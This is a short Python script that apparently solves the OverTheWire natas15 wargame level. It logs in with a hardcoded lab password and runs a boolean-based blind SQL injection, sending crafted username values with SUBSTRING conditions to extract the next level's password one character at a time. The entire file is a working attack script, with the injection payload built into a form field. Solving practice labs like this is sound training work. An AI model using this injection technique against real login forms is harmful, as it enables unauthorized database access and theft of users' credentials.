#!/bin/python3

import requests
import string

#Target URL and credentials
url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

#Characters to test (all letters and numbers)
charset = string.ascii_letters + string.digits

#Storage for the extracted password
extracted_password = ""

#Session to maintain connection and authentication
session = requests.Session()
session.auth = (username, password)

print("[*] Starting password extraction...")

#We know the password is 32 characters from previous levels
for position in range(1, 33):
	for char in charset:
		#Craft the boolean-based injection payload
		payload = {
			'username': f'natas16" AND BINARY SUBSTRING(password,{position},1)=\'{char}\' -- -'
		}
		
		#Send the request
		response = session.post(url, data=payload)
		
		#Check if the character is correct (boolean response)
		if "This user exists" in response.text:
			extracted_password += char
			print(f"[+] Found character {position}: {char} -> Current: {extracted_password}")
			break
		
	#If we didn't find a character
	if len(extracted_password) < position:
		print(f"[-] Couldn't find character at position {position}")
		break

print(f"[!] Complete password: {extracted_password}")
